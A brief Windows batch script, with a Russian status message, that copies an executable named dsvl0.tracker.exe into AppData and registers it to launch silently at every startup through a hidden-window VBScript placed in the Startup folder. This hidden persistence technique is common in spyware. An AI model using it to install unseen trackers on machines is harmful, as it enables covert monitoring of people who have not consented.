@echo off
set SRC=dsvl0.tracker.exe
set DST=%APPDATA%\dsvl0

if not exist "%DST%" mkdir "%DST%"

copy "%SRC%" "%DST%\%SRC%" /Y

set VBS=%DST%\run_silent.vbs
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run Chr(34^) ^& "%DST%\%SRC%" ^& Chr(34^), 0
) > "%VBS%"

set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%VBS%" "%STARTUP%\run_silent.vbs" /Y

echo [OK] Установлено: %SRC% будет запускаться при старте Windows без окна консоли.
pause
